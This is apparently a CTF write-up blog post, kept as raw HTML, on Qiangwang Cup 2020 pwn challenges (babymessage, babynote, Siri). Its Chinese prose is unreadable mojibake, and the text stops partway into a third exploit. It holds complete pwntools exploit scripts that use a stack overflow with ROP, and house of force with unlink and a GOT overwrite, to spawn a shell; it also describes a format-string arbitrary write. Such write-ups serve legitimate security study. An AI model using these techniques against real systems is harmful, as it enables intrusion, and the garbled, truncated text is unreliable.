    <content type="html"><![CDATA[<p>å—åˆ°æ‘¸é±¼å’Œå„ç§é¡¹ç›®å‹åŠ›ä¹‹åï¼Œç»ˆäºå‘å‡ºæ¥äº†ï¼Œè¿™æ¬¡æ˜¯å¼ºç½‘æ¯ä¸­å¼ºç½‘å…ˆé”‹çš„4é“pwné¢˜ï¼Œå‰©ä¸‹çš„pwné¢˜è¿˜åœ¨é™†ç»­å¤ç°ingï¼Œåœ¨åšäº†åœ¨åšäº†ing</p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>ä¸€é“ç¥å¥‡çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œæœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼Œå†™nameï¼Œå†™messageï¼Œè¾“å‡ºbufï¼Œå…¶ä¸­messageçš„æ•°æ®ä¼šè¢«strcopyåˆ°bufä¸Šã€‚è¿™é‡Œçš„æº¢å‡ºç‚¹æ˜¯åœ¨å†™messageçš„åŠŸèƒ½ä¸Šï¼Œä¸€å¼€å§‹åªèƒ½å¤Ÿæº¢å‡º16å­—èŠ‚ï¼Œè¦†ç›–æ‰æ ˆå˜é‡+rbpçš„å€¼ã€‚è¿™é‡Œå¦‚æœåªæ˜¯çœ‹åç¼–è¯‘çš„ä»£ç æ˜¯çœ‹ä¸å‡ºé—®é¢˜çš„ï¼Œä¸€å®šè¦è§‚å¯Ÿæ±‡ç¼–ä»£ç ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ç»å¸¸å¤±è¯¯çš„åœ°æ–¹ä¸å¤ªçˆ±çœ‹æ±‡ç¼–ï¼Œ555555ã€‚</p><p>è¿™é‡Œçš„å†™messageçš„å‡½æ•°é‡Œå¸¦ç€ä¸€ä¸ªå±€éƒ¨å˜é‡sizeï¼Œè€Œè¿™ä¸ªå˜é‡å› ä¸ºæ˜¯å±€éƒ¨å˜é‡ï¼Œå®ƒæ˜¯å—åˆ°rbpçš„å€¼å½±å“çš„ã€‚</p><img src="/2020/09/15/2020qwb-qwxf-pwn/1.png"><p>æ‰€ä»¥æˆ‘ä»¬çš„æº¢å‡ºç‚¹æ§åˆ¶ä½äº†rbpï¼Œå°±èƒ½å¤Ÿæ§åˆ¶è¿™ä¸ªsizeå±€éƒ¨å˜é‡çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„è¾“å…¥å¤§å°å°±ä¼šå¢å¤§ï¼Œå¯ä»¥åœ¨æ ˆä¸Šå¸ƒç½®rop chainã€‚é‚£ä¹ˆè¿™é‡Œæœ‰å“ªäº›åˆé€‚çš„åœ°æ–¹å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªç¨‹åºæ²¡æœ‰å¼€å¯aslrï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰¾bssæ®µä¸Šçš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯nameæˆ–è€…bufï¼Œè€Œè¿™é‡Œåˆšå¥½æœ‰åŠŸèƒ½å¯ä»¥å†™åˆ°è¿™ä¸¤ä¸ªåœ°æ–¹ï¼Œé‚£ä¹ˆæ€è·¯å°±æœ‰äº†ã€‚</p><p>é€šè¿‡ç›¸å…³åŠŸèƒ½å‘nameæˆ–è€…bufå†™å…¥ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ•°ï¼Œç„¶åé€šè¿‡æº¢å‡ºä¿®æ”¹rbpçš„å€¼ï¼Œè®©<code>rbp-0x4</code>å…¶æŒ‡å‘æˆ‘ä»¬ä¿®æ”¹çš„åœ°æ–¹ï¼Œè¿™æ ·sizeå°±è¢«æˆ‘ä»¬æ§åˆ¶ä½äº†ï¼ŒéšåæŒ‰ç…§ä¸€èˆ¬çš„ROPæ“ä½œæ³„éœ²libcï¼Œè¿”å›æº¢å‡ºç‚¹å†æ¬¡æº¢å‡ºgetshellã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./babymessage'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babymessage'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'name: \n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_mess</span><span class="params">(message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'message: \n'</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x6010D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400ac3</span></span><br><span class="line">message = <span class="number">0x400995</span></span><br><span class="line">pause()</span><br><span class="line">l_name(p32(<span class="number">0x1000</span>))</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>))</span><br><span class="line">pause()</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(message))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">'libc address: '</span> + hex(libc_addr))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">'message:'</span>, <span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><p>è¿™é“é¢˜çš„æ¼æ´ç‚¹åœ¨äºä½¿ç”¨äº†å­—ç¬¦ä¸²å¤åˆ¶å‡½æ•°strcpyï¼Œä½†æ˜¯nameæ•°ç»„å¹¶æ²¡æœ‰åœ¨æœ«å°¾æ·»åŠ <code>\x00</code>ï¼Œè™½ç„¶åœ¨ä¸€å¼€å§‹å¯¹ç›¸åº”åŒºåŸŸåˆå§‹åŒ–ä¸º0ï¼Œä½†æ˜¯æˆ‘ä»¬å¦‚æœæŠŠnameå…¨éƒ¨å¡«æ»¡ï¼Œé‚£ä¹ˆåœ¨å­—ç¬¦ä¸²å¤åˆ¶çš„æ—¶å€™ä¼šè®¤ä¸ºnameä¸ä¹‹åçš„ageä¸ºåŒä¸€éƒ¨åˆ†ï¼Œæœ€ç»ˆä¼šæŠŠåé¢çš„ageéƒ¨åˆ†ä¸€åŒå¤åˆ¶ï¼Œè¿™æ ·é’ˆå¯¹destçš„å¤åˆ¶ä¼šæº¢å‡ºã€‚</p><img src="/2020/09/15/2020qwb-qwxf-pwn/2.png"><p>è¿™é‡Œé’ˆå¯¹destçš„æº¢å‡ºæœ€å¤šèƒ½æº¢å‡º8ä¸ªå­—èŠ‚ï¼Œè€Œè¿™é‡Œçš„destæ­£å¥½sizeä¸º0x18ï¼Œè¿™å°±æ„å‘³ç€å®ƒå ç”¨äº†ä¸‹ä¸€ä¸ªchunkçš„prev_sizeåŒºåŸŸï¼Œè¿™æº¢å‡ºçš„8ä¸ªå­—èŠ‚èƒ½å¤Ÿåˆšå¥½è¦†ç›–ä¸‹ä¸€ä¸ªchunkçš„sizeåŒºåŸŸã€‚</p><p>æˆ‘ä»¬èƒ½æ§åˆ¶ä¸‹ä¸€å—chunkçš„sizeï¼Œç¢°å·§çš„æ˜¯è¿™ä¸‹ä¸€å—chunkåˆšå¥½æ˜¯top chunkï¼ŒåŒæ—¶ä¹Ÿèƒ½åˆ†é…å°äº0x100çš„chunkï¼Œè¿™åˆšå¥½æ»¡è¶³house of forceçš„æ”»å‡»è¦æ±‚ï¼Œç¼ºç‚¹æ˜¯å‘é«˜åœ°å€ç§»åŠ¨è·ç¦»æœ‰é™ï¼Œæ›´å¤šçš„åªèƒ½è®©top chunkå‘ä½åœ°å€ç§»åŠ¨ã€‚</p><h3 id="house-of-force-unlink-fastbin-attack"><a href="#house-of-force-unlink-fastbin-attack" class="headerlink" title="house of force + unlink/fastbin attack"></a>house of force + unlink/fastbin attack</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¸ƒç½®ä¸‰ä¸ª0x100çš„å †å—ç­‰å¾…ä¹‹åèƒ½ä»»æ„åˆ†é…chunkæ—¶æ„é€ unlinkï¼Œéšååˆ©ç”¨ç¨‹åºæä¾›çš„é‡ç½®åŠŸèƒ½ï¼Œè§¦å‘ä¸Šé¢çš„å­—ç¬¦ä¸²å¤åˆ¶çš„æ¼æ´è¦†ç›–top chunkçš„sizeåŒºåŸŸä¸º-1ï¼Œæ¢ç®—æˆè¡¥ç ä¹Ÿå°±æ˜¯<code>0xffffffffffffffff</code>ã€‚åœ¨åˆ†é…chunkçš„æ—¶å€™sizeä¼šè¢«å½“åšæ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥-1ä¼šå˜æˆæœ€å¤§å€¼ã€‚æƒ³è¦æ§åˆ¶ä¸‰å—0x100ä¸­é—´çš„chunkï¼Œéœ€è¦è°ƒè¯•è®¡ç®—å…¶ä¸­çš„å·®å€¼ï¼Œè€Œè¿™ä¸ªå·®å€¼è¿˜éœ€è¦å†å‡0x10ï¼Œä¸ºä»€ä¹ˆè¦å‡0x10ï¼Œä¹Ÿæ˜¯å› ä¸ºæˆ‘ä»¬è¯·æ±‚çš„å¤§å°ä¼šè¢«è½¬æ¢æˆè¯·æ±‚chunkçš„å¤§å°ï¼Œæœ‰ä¸€ä¸ªchunk headçš„éƒ¨åˆ†éœ€è¦0x10å­—èŠ‚ã€‚</p><img src="/2020/09/15/2020qwb-qwxf-pwn/3.png"><p>è¿™é‡Œæˆ‘ä»¬çš„top chunkèµ·å§‹åœ°å€ä¸º0x1d0f590ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ§åˆ¶ç¬¬äºŒä¸ªchunkä¹Ÿå°±æ˜¯0x1d0f240ï¼Œä¸ºäº†æ§åˆ¶è¿™ä¸ªchunkå°±éœ€è¦èƒ½æ”¹å˜chunkå¤´éƒ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ†é…chunkåˆ°0x1d0f230ï¼Œåˆšå¥½å°±èƒ½å†™åˆ°å¤´éƒ¨ï¼Œæ”¹å˜prev_sizeå’Œsizeã€‚ä¸­é—´å·®äº†0x360å†åŠ ä¸Š0x10ä¸€å…±0x370ã€‚é€šè¿‡åˆ†é…è°ƒæ•´top chunkä½ç½®ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦å†æ¬¡åˆ†é…0x20å¤§å°çš„chunkå°±èƒ½æ§åˆ¶å¤´éƒ¨ã€‚è¿™é‡Œç”³è¯·0x10å’Œ0x20éƒ½æ˜¯ä¸€ä¸ªæ•ˆæœï¼Œç”³è¯·0x10ä¼šå¾—åˆ°0x20çš„chunkï¼Œç”³è¯·0x20ä¼šå¾—åˆ°0x30çš„chunkã€‚</p><p>åœ¨èƒ½å¤Ÿæ§åˆ¶å¤´éƒ¨ä¹‹åï¼Œä¼ªé€ prev_sizeå’Œsizeï¼Œè®©å †ç®¡ç†è®¤ä¸ºå‰é¢çš„chunkå·²ç»é‡Šæ”¾ï¼Œåˆ é™¤ä¸­é—´çš„å—è§¦å‘unlinkå‰é¢çš„chunkï¼Œåœ¨åˆ é™¤ä¹‹å‰éœ€è¦åœ¨å‰é¢çš„chunkä¸­å¸ƒç½®éœ€è¦æ”¹å˜çš„åœ°å€-0x18å’Œåœ°å€-0x10ï¼Œæœ€åé€ æˆçš„æ•ˆæœæ˜¯ç›®æ ‡åœ°å€çš„å€¼å˜æˆåœ°å€çš„å€¼-0x18ã€‚æœ‰äº†è¿™ä¸ªæˆ‘ä»¬èƒ½æ”¹å˜æŒ‡é’ˆçš„å€¼ï¼Œè®©å®ƒæŒ‡å‘åœ°å€å‰é¢ï¼Œé…åˆç¨‹åºçš„ä¿®æ”¹åŠŸèƒ½æˆ‘ä»¬èƒ½æ³„éœ²å†™è¿›çš„gotå‡½æ•°åœ°å€ï¼ŒåŒæ—¶èƒ½æŠŠå®ƒä¿®æ”¹æˆå…¶ä»–å‡½æ•°ï¼Œæ¯”å¦‚systemã€‚è¿™é‡Œå°±æ˜¯å…ˆæ³„éœ²freeå‡½æ•°ï¼Œè·å¾—libcåŸºåœ°å€ï¼Œå†å†™å…¥systemåœ°å€ã€‚æœ€åæ„é€ ä¸€ä¸ªchunkï¼Œé‡Œé¢çš„å†…å®¹ä¸º<code>/bin/sh\x00</code>ï¼Œå°†å…¶é‡Šæ”¾å³å¯è·å¾—shellã€‚</p><p>è¿™é‡Œå…¶å®ä¹Ÿå¯ä»¥ä¸ç”¨unlinkæ”»å‡»ï¼Œå¯ä»¥ä½¿ç”¨fastbin attackï¼Œæˆ‘ä»¬å·²ç»èƒ½åˆ†é…åˆ°ä½åœ°å€çš„chunkï¼Œé‚£ä¹ˆä¹Ÿèƒ½å¤Ÿä¿®æ”¹é‡Šæ”¾è¿›fastbinçš„chunkï¼Œè®©å…¶æŒ‡å‘free_hookæˆ–è€…malloc_hookçš„ä½åœ°å€å¤„ï¼Œåˆ†é…æ‹¿åˆ°chunkåç›´æ¥ä¿®æ”¹ä¸ºone_gadgetã€‚</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>è¿™æ˜¯å¦å¤–ä¸€ç§æ€è·¯ï¼ŒåŒæ ·åˆ©ç”¨strcpyæº¢å‡ºchunkçš„sizeåŒºåŸŸï¼Œä¸è¿‡è¿™é‡Œåªæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œé¦–å…ˆç”³è¯·ä¸€ä¸ª0x18å­—èŠ‚çš„noteï¼Œå†é‡Šæ”¾å®ƒä½¿å…¶è¿›å…¥fastbinä¸­ï¼Œè¿™æ ·ä¹‹åä¿®æ”¹nameæ—¶ç”³è¯·çš„0x18å­—èŠ‚ä¼šåœ¨fastbinä¸­å–åˆ°è¿™ä¸ªchunkï¼Œè¾¾åˆ°æˆ‘ä»¬æƒ³è¦æº¢å‡ºçš„åœ°ç‚¹ã€‚æ§åˆ¶chunkçš„å¤§å°ä¸ºsmall binèŒƒå›´ï¼Œéšåé‡Šæ”¾è¿™ä¸ªchunkï¼Œè®©å®ƒè¿›å…¥unsorted binä¸­ï¼Œå†æ¬¡åˆ†é…åŸæ¥å¤§å°çš„chunkï¼Œåœ¨fastbinä¸­æ²¡æœ‰åˆé€‚çš„chunkæ—¶ä¼šåˆ‡åˆ†unsorted binä¸­çš„chunkï¼Œåˆ‡åˆ†ä¹‹åå‰©ä¸‹çš„éƒ¨åˆ†ä¾æ—§åœ¨unsorted biné‡Œé¢ï¼Œå®ƒçš„æŒ‡é’ˆä¼šè¢«å†™è¿›ä¹‹å‰chunkçš„ä¸‹ä¸€å—chunkä¸­ï¼Œè¿™æ ·åˆ©ç”¨è¾“å‡ºåŠŸèƒ½å°±èƒ½æ³„éœ²å‡ºlibcç›¸å…³åœ°å€ï¼Œå¾—åˆ°libcåŸºåœ°å€ã€‚</p><p>åœ¨æ³„éœ²å®Œæˆä¹‹åï¼Œå†æ¬¡åˆ†é…ä¸‹ä¸€ä¸ªchunkåŒæ ·å¤§å°çš„chunkï¼Œæˆ‘ä»¬å°±æ‹¿åˆ°äº†ä¸¤ä¸ªæŒ‡å‘åŒä¸€chunkçš„æŒ‡é’ˆï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥å¼€å§‹uafæ”»å‡»ï¼Œé‡Šæ”¾å…¶ä¸­ä¸€ä¸ªæŒ‡é’ˆï¼Œè®©è¿™ä¸ªchunkè¿›å…¥fastbinä¸­ï¼Œå†é€šè¿‡å¦å¤–ä¸€ä¸ªæŒ‡é’ˆä¿®æ”¹fastbinæŒ‡é’ˆï¼ŒæŒ‡å‘malloc_hookçš„ä½åœ°å€å¤„ï¼Œéšåå°±æ˜¯åˆ†é…ä¸¤æ¬¡0x70çš„chunkï¼Œç¬¬äºŒæ¬¡å°±èƒ½æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„chunkï¼Œå†™å…¥one_gadgetè¦†ç›–malloc_hookçš„ä½ç½®ï¼Œå®Œæˆgetshellã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>è¿™é‡Œç»™çš„æ˜¯house of forceæ–¹æ³•çš„exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./babynotes'</span>)</span><br><span class="line"><span class="comment">#sh = remote('123.56.170.202',43121)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babynotes'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input note size:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendafter(<span class="string">'Input your note:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">()</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">pause()</span><br><span class="line">reset()</span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>.ljust(<span class="number">0x18</span>,<span class="string">'a'</span>))</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'-1'</span>)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">4</span>,<span class="number">-0x370</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>) <span class="comment"># get chunk1 head</span></span><br><span class="line"><span class="comment">#top chunkä¸Šç§»</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>))</span><br><span class="line">heap0_ptr_addr = <span class="number">0x6020E0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(heap0_ptr_addr - <span class="number">0x18</span>) + p64(heap0_ptr_addr - <span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Note 0: '</span>)</span><br><span class="line">free_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>ä¸€ä¸ªå…¸å‹çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‡ºç°åœ¨0x1212å‡½æ•°ä¸­ã€‚</p><img src="/2020/09/15/2020qwb-qwxf-pwn/4.png"><p>è¾“å…¥<code>Hey Siri!</code>å¯åŠ¨siriä¹‹åï¼Œæˆ‘ä»¬è¾“å…¥å¼€å¤´å¸¦æœ‰<code>remind me to</code>çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½è¿›å…¥æ¼æ´ç‚¹ã€‚æˆ‘ä»¬åœ¨<code>remind me to</code>ä¹‹åçš„è¾“å…¥å†…å®¹ä¼šè¢«å¸¦å…¥æ–°çš„å­—ç¬¦ä¸²ä¸­ï¼Œprintfè§¦å‘è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ã€‚</p><p>é¦–å…ˆåˆ©ç”¨æ¼æ´æ³„éœ²æ•°æ®ï¼ŒåŒ…æ‹¬æ ˆåœ°å€å’Œlibcåœ°å€ï¼Œæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²<code>%83$p</code>å’Œ<code>%44$p</code>å¯ä»¥è·å–åˆ°libcç›¸å…³çš„åœ°å€å’Œæ ˆåœ°å€ã€‚å‰©ä¸‹å°±æ˜¯é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ„é€ ä»»æ„å†™ï¼Œå‘ä¸€äº›åœ°å€å†™one_gadgetã€‚</p><p>æ„é€ ä»»æ„å†™çš„æ–¹æ³•å°±æ˜¯åœ¨æ ˆä¸Šå¸ƒç½®ä¸€äº›éœ€è¦å†™çš„åœ°å€ï¼Œç„¶åé€šè¿‡<code>%yyc%xx$hhn</code>çš„æ–¹æ³•å‘æ ˆä¸Šé‚£ä¸ªåç§»é‡çš„åœ°å€å†™å€¼ã€‚å…¶ä¸­æœ‰äº›åœ°æ–¹éœ€è¦å¯¹é½ï¼Œæ‰€ä»¥åœ¨æŸåœ°ä½ç½®è¦å¡«å……æ•°æ®ä¿è¯å¯¹é½ã€‚æœ‰äº†ä»»æ„åœ°å€å†™ï¼Œæˆ‘ä»¬çš„æ–¹æ³•å°±æœ‰å¾ˆå¤šäº†ã€‚</p><h3 id="æ”¹å†™hook"><a href="#æ”¹å†™hook" class="headerlink" title="æ”¹å†™hook"></a>æ”¹å†™hook</h3><p>æ”¹å†™<code>malloc_hook</code>ï¼Œå†™å…¶ä¸­å†™å…¥one_gadgetï¼Œç„¶åè¾“å…¥å¤§é‡çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±ä¼šè§¦å‘mallocï¼Œæ‹¿åˆ°shellã€‚</p><h3 id="æ”¹å†™è¿”å›åœ°å€"><a href="#æ”¹å†™è¿”å›åœ°å€" class="headerlink" title="æ”¹å†™è¿”å›åœ°å€"></a>æ”¹å†™è¿”å›åœ°å€</h3><p>æ”¹å†™mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥è¿”å›åˆ°mainå‡½æ•°ï¼Œæ‰€ä»¥å†æœ€åä¸€æ¬¡æ”¹å†™å­å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè®©å®ƒçš„è¿”å›åœ°å€æŒ‡å‘<code>leave ret</code>ï¼Œè¿™æ ·å°±ä¼šè¿›è¡Œæ ˆè¿ç§»ï¼Œä½¿å¾—SPæŒ‡å‘mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯one_gadgetå¤„ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>æ³¨æ„ä¸€ç‚¹ï¼Œç»™çš„libcå’Œubuntuè‡ªå¸¦çš„libcæœ‰ä¸€äº›ä¸åŒï¼Œæ‰€ä»¥åœ¨æ‰“è¿œç¨‹çš„æ—¶å€™è¦ç”¨å®ƒç»™çš„libcã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 